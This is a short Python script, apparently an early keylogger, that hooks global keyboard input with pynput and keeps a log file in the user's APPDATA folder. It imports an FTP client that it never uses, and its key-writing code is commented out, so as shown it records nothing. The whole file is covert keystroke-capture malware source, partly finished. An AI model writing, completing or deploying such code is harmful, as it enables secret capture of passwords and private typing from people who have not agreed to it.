import os
from pynput import keyboard
from ftplib import FTP

appdata = os.getenv('APPDATA')
keylogs = appdata+'/keys.txt'

spec_chars = {
    keyboard.Key.alt: " <ALT> ",
    keyboard.Key.alt_l: " <LEFT ALT> ",
    keyboard.Key.backspace: " <BACKSPACE> ",
    keyboard.Key.caps_lock: " <CAPSLOCK> ",
    keyboard.Key.space: " <SPACE> ",
}

if os.path.exists(keylogs):
    f = open(keylogs, 'r')
    f.close()
    #os.remove(keylogs)
else:
    f = open(keylogs, 'w')

def on_press(key):
    f = open(keylogs, 'a')
    #print(key)
    # for specchar in spec_chars:
    #     if key == specchar:
    #         f.write(spec_chars[key])
    #     else:
    #         f.write(key.char)

    f.close()

def on_release(key):
    if key == keyboard.Key.esc: 
        return False

with keyboard.Listener(
        on_press = on_press,
        on_release = on_release) as listener:
    listener.join()

listener = keyboard.Listener(
    on_press = on_press,
    on_release = on_release)

listener.start()